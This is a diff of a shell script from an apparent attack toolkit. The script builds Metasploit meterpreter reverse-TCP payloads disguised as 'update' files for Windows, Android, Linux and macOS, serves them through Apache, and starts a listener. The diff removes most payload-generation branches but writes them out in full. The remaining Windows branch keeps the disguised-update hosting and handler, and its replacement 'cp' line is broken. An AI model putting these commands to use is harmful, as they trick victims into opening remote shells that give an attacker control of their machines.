@@ -30,9 +30,6 @@ If you do not want to use the program, please press Ctrl+C to exit.
 
 ---------------------------------------------------------------------------
 [1] Windows - update.exe [payload and listener] 
-[2] Android - update.apk [payload and listener]  
-[3] Linux   - update.py  [payload and listener] 
-[4] MacOS   - update.jar [payload and listener]
 [5]         - Cleaning
 '
 
@@ -48,39 +45,13 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then 
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > UPDATEE101.exe
+cp  > UPDATEE101.exe
 	mv UPDATEE101.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
-# 2
-elif [ "$x" == "$apk" ]; then                          
-msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
-	mv /root/Desktop/update.apk /var/www/html
-	systemctl start apache2.service
-echo -e 'Waiting for listener...'
-msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-# 3
-elif [ "$x" == "$py" ]; then                       
-msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
-        cd /root/Desktop/
-	tar -czvf update.tar.gz update.py
-	mv /root/Desktop/update.tar.gz /var/www/html
-		rm /root/Desktop/update.py
-	systemctl start apache2.service
-echo -e 'Waiting for listener...'
-msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-# 4
-elif [ "$x" == "$jar" ]; then                        
-msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
-	mv /root/Desktop/update.jar /var/www/html
-	systemctl start apache2.service
-echo -e 'Waiting for listener...'
-msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 # 5	
 elif [ "$x" == "$cl" ]; then
